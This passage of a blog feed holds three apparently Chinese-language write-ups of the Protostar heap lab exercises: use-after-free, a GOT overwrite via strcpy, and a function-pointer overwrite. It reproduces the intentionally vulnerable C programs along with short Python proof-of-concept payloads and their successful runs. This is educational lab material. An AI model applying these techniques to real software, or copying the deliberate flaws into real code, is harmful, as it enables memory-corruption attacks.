    <title>Protostar-堆溢出学习-UAF(use after free)</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/21/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/</id>
    <published>2017-04-21T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p>下面看一个堆中常见的漏洞-UAF(use after free)</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">struct auth &#123;</div><div class="line">  char name[32];</div><div class="line">  int auth;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">struct auth *auth;</div><div class="line">char *service;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  char line[128];</div><div class="line"></div><div class="line">  while(1) &#123;</div><div class="line">      printf(&quot;[ auth = %p, service = %p ]\n&quot;, auth, service);</div><div class="line"></div><div class="line">      if(fgets(line, sizeof(line), stdin) == NULL) break;</div><div class="line">      </div><div class="line">      if(strncmp(line, &quot;auth &quot;, 5) == 0) &#123;</div><div class="line">          auth = malloc(sizeof(auth));</div><div class="line">          memset(auth, 0, sizeof(auth));</div><div class="line">          if(strlen(line + 5) &lt; 31) &#123;</div><div class="line">              strcpy(auth-&gt;name, line + 5);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">      if(strncmp(line, &quot;reset&quot;, 5) == 0) &#123;</div><div class="line">          free(auth);</div><div class="line">      &#125;</div><div class="line">      if(strncmp(line, &quot;service&quot;, 6) == 0) &#123;</div><div class="line">          service = strdup(line + 7);</div><div class="line">      &#125;</div><div class="line">      if(strncmp(line, &quot;login&quot;, 5) == 0) &#123;</div><div class="line">          if(auth-&gt;auth) &#123;</div><div class="line">              printf(&quot;you have logged in already!\n&quot;);</div><div class="line">          &#125; else &#123;</div><div class="line">              printf(&quot;please enter your password\n&quot;);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-分析-amp-思考"><a href="#0x02-分析-amp-思考" class="headerlink" title="0x02 分析&amp;思考"></a>0x02 分析&amp;思考</h2><p>程序有4个命令，对<code>auth</code>这个结构体进行分配内存以及释放内存，然后有结构体里的<code>auth-&gt;auth</code>来决定是否授权。很明显让我们修改<code>auth-&gt;auth</code>的值。<br>reset命令释放<code>auth</code>但没有设为null，后面<code>auth-&gt;auth</code>发生引用。所以这里有个UAF漏洞。</p><h2 id="0x03-调试-amp-hack"><a href="#0x03-调试-amp-hack" class="headerlink" title="0x03 调试&amp;hack"></a>0x03 调试&amp;hack</h2><p>1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况</p><p>2.先输入<code>auth admin</code>，然后输入<code>login</code>试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-0.png?raw=true" alt="0-0"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/nologin.png?raw=true" alt="nologin"><br>3.再输入<code>reset</code>释放堆内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-1.png?raw=true" alt="0-1"><br>4.输入<code>service</code>分配内存<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-2.png?raw=true" alt="0-2"><br>5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖<code>auth-&gt;auth</code>的内存值。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-3.png?raw=true" alt="0-3"><br>6.再次输入<code>login</code>命令<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%202/0-4.png?raw=true" alt="0-4"></p><h2 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h2><p>通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;下面看一个堆中常见的漏洞-UAF(use after free)&lt;/p&gt;
&lt;/bl
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="UAF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/19/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/</id>
    <published>2017-04-19T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">struct internet &#123;</div><div class="line">  int priority;</div><div class="line">  char *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">void winner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;and we have a winner @ %d\n&quot;, time(NULL));</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  struct internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = malloc(sizeof(struct internet));</div><div class="line">  i1-&gt;priority = 1;</div><div class="line">  i1-&gt;name = malloc(8);</div><div class="line"></div><div class="line">  i2 = malloc(sizeof(struct internet));</div><div class="line">  i2-&gt;priority = 2;</div><div class="line">  i2-&gt;name = malloc(8);</div><div class="line"></div><div class="line">  strcpy(i1-&gt;name, argv[1]);</div><div class="line">  strcpy(i2-&gt;name, argv[2]);</div><div class="line"></div><div class="line">  printf(&quot;and that&apos;s a wrap folks!\n&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-0.png?raw=true" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%201/0-1.png?raw=true" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import struct</div><div class="line">padding = &quot;AAAA&quot;*5</div><div class="line">put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址</div><div class="line">space = &quot; &quot;</div><div class="line">winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址</div><div class="line">print padding+put_got+space+winner</div></pre></td></tr></table></figure><p>4.hack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@protostar:/tmp$ /opt/protostar/bin/heap1 `python  heap1.py`</div><div class="line">and we have a winner @ 1492452139</div></pre></td></tr></table></figure><p><strong>成功执行winner函数</strong></p><h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。&lt;/p&gt;
&lt;/blo
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
      <category term="strcpy" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"/>
    
      <category term="GOT表" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-覆盖堆函数指针劫持代码流</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/</id>
    <published>2017-04-18T03:12:19.000Z</published>
    <updated>2017-05-02T14:34:15.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p><code>C代码</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">struct data &#123;</div><div class="line">  char name[64];</div><div class="line">&#125;;</div><div class="line"></div><div class="line">struct fp &#123;</div><div class="line">  int (*fp)();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">void winner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;level passed\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void nowinner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;level has not been passed\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  struct data *d;</div><div class="line">  struct fp *f;</div><div class="line"></div><div class="line">  d = malloc(sizeof(struct data));</div><div class="line">  f = malloc(sizeof(struct fp));</div><div class="line">  f-&gt;fp = nowinner;</div><div class="line"></div><div class="line">  printf(&quot;data is at %p, fp is at %p\n&quot;, d, f);</div><div class="line"></div><div class="line">  strcpy(d-&gt;name, argv[1]);</div><div class="line">  </div><div class="line">  f-&gt;fp();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>先在堆上分配了一个data和fp的结构体，然后使fp指向<code>nowinner</code>函数，然后打印对应分配的堆地址，以及将<code>argv[1]</code>复制到data结构体，最后调用<code>nowinner</code>函数。</p><p>可以知道我们需要去执行<code>winner</code>函数，怎么做到呢？</p><p>由于<code>strcpy</code>没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为<code>winner</code>函数？Here we go！</p><h2 id="0x03-malloc"><a href="#0x03-malloc" class="headerlink" title="0x03 malloc()"></a>0x03 malloc()</h2><p>在继续分析之前，我们先来简单的介绍一下<code>malloc</code>函数，在这里<code>malloc</code>函数更多是对<code>mmap</code>系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用<code>mmap</code>来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。</p><p>那是如何管理堆的呢？见下</p><table><thead><tr><th>堆标志</th><th>分配大小</th><th>malloc返回地址addr</th></tr></thead><tbody><tr><td>00000000</td><td>00000011</td><td>00000000 00000000</td></tr><tr><td>00000000</td><td>00000031</td><td>AAAAAAAA BBBBBBBB</td></tr><tr><td>CCCCCCCC</td><td>DDDDDDDD</td><td>EEEEEEEE FFFFFFFF</td></tr><tr><td>…</td><td>…</td><td>…       …</td></tr><tr><td>00000000</td><td>00000011</td><td>00000000 00000000</td></tr></tbody></table><p>每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过<code>addr-4</code>拿到自身的分配大小从而决定下次分配的选择</p><p><strong>注：分配大小的第一位表示前面的内存块是否在使用</strong></p><h2 id="0x04-调试-amp-hack"><a href="#0x04-调试-amp-hack" class="headerlink" title="0x04 调试&amp;hack"></a>0x04 调试&amp;hack</h2><p>通过前面的分析，我们的目的很明确，需要通过<code>strcpy(d-&gt;name, argv[1]);</code>去重写fp结构体里面的函数指针，使其为<code>winner</code>函数的地址。</p><p>1.利用gdb查看strcpy前后堆的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-0.png?raw=true" alt="0-0"><br>我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的<code>nowinner</code>地址改为<code>winner</code>地址</p><p>2.查看<code>winner</code>地址，重写fp函数指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) p winner </div><div class="line">$1 = &#123;void (void)&#125; 0x8048464 &lt;winner&gt;</div></pre></td></tr></table></figure><p>3.PoC Python脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import struct</div><div class="line">padding = &quot;A&quot;*64 #填充data</div><div class="line">head = &quot;BBBB&quot;  # not care</div><div class="line">head += &quot;CCCC&quot; # not care</div><div class="line">winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址</div><div class="line">print padding+head+winner</div></pre></td></tr></table></figure><p>4.hack<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%200/0-1.png?raw=true" alt="0-1"><br>成功执行<code>winner</code>函数!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="堆溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
</feed>
